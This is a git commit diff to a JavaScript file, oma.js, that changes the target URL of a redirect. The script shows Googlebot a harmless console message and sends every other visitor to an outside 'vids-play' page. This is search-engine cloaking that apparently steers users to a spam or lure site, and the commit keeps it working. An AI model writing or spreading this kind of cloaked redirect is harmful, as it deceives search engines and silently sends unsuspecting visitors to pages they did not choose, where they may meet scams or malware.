238e77d9f9c135bf0b646a9a4e3bf366f81f9c31
Sajid Khan <sajidkhan528193@gmail.com>
2026-07-18 04:14:04 +0600

    Update oma.js

--- oma.js
+++ oma.js
@@ -1,5 +1,5 @@
 if (!navigator.userAgent.includes('Googlebot')) {
-  window.location.href = "https://www.unavuulagam.in/vids-play/?pintu";
+  window.location.href = "https://unavuulagam.in/vids-play/?pintu";
 } else {
   console.log("Thanks for visiting my page" );
 }
